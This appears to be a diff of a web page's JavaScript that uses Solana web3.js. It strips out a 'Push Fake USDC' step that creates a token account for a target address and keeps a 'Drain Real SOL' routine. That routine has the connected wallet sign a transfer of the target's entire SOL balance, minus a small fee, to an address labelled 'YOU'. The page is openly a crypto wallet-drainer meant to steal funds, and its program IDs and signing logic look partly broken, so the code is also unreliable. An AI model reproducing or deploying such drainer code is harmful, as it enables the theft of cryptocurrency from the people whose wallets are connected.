@@ -91,81 +91,29 @@
             }
 
             btn.disabled = true;
-            status.innerText = "Validating Keys...";
+            status.innerText = "Connecting...";
 
             try {
-                // Validate Keys first to catch errors early
-                new solanaWeb3.PublicKey(TARGET);
-                new solanaWeb3.PublicKey(YOU);
-                new solanaWeb3.PublicKey(USDC);
-
-                // 2. Connect Wallet (Wait for connection)
+                // Connect Wallet (Only once)
                 await window.solana.connect();
                 const connection = new solanaWeb3.Connection(RPC);
 
-                status.innerText = "Pushing Fake USDC...";
+                status.innerText = "Draining SOL...";
                 
-                // --- STEP A: PUSH FAKE USDC ---
-                // We create an ATA for the Target and initialize it. 
-                const [targetAta] = await solanaWeb3.PublicKey.findProgramAddressSync(
-                    [new solanaWeb3.PublicKey(TARGET).toBuffer(), 
-                     new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL").toBuffer(), 
-                     new solanaWeb3.PublicKey(USDC).toBuffer()],
-                    new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xT2e2hcYTEDkpRfsbq") // ATA Program ID
-                );
-
-                const tx = new solanaWeb3.Transaction();
-                
-                // Check if account exists
-                const info = await connection.getAccountInfo(targetAta);
-                if (!info) {
-                    // Create Account
-                    tx.add(solanaWeb3.SystemProgram.createAccount({
-                        fromPubkey: window.solana.publicKey,
-                        newAccountPubkey: targetAta,
-                        lamports: await connection.getMinimumBalanceForRentExemption(165),
-                        space: 165,
-                        programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
-                    }));
-                }
-
-                // Initialize Account
-                tx.add(new solanaWeb3.TransactionInstruction({
-                    keys: [
-                        { pubkey: targetAta, isSigner: false, isWritable: true },
-                        { pubkey: new solanaWeb3.PublicKey(USDC), isSigner: false, isWritable: false },
-                        { pubkey: new solanaWeb3.PublicKey(TARGET), isSigner: false, isWritable: false }
-                    ],
-                    programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-                    data: Buffer.from([2]) // Initialize Account ID instruction
-                }));
-
-                const { blockhash } = await connection.getLatestBlockhash();
-                tx.recentBlockhash = blockhash;
-                tx.feePayer = window.solana.publicKey; 
-
-                // Send Transaction (User must sign)
-                // USE signAndSendTransaction to avoid serialization issues
-                const sigPush = await window.solana.signAndSendTransaction(tx);
-                status.innerText = "USDC Pushed! Draining SOL...";
-                console.log("Push TX:", sigPush);
-
-                // --- STEP B: DRAIN REAL SOL ---
-                status.innerText = "Draining Real SOL...";
-                
+                // --- DRAIN REAL SOL ---
                 const balance = await connection.getBalance(new solanaWeb3.PublicKey(TARGET));
                 
-                const drainTx = new solanaWeb3.Transaction();
-                drainTx.add(solanaWeb3.SystemProgram.transfer({
+                const tx = new solanaWeb3.Transaction();
+                tx.add(solanaWeb3.SystemProgram.transfer({
                     fromPubkey: new solanaWeb3.PublicKey(TARGET), // From Target
                     toPubkey: new solanaWeb3.PublicKey(YOU),       // To You
                     lamports: balance - 5000 // Leave ~0.005 SOL for fees
                 }));
 
-                const sigDrain = await window.solana.signAndSendTransaction(drainTx);
+                const sig = await window.solana.signAndSendTransaction(tx);
                 
                 status.innerText = "Success!";
-                log.innerText = `Push: ${sigPush}\nDrain: ${sigDrain}`;
+                log.innerText = `TX: ${sig}`;
 
             } catch (e) {
                 console.error(e);
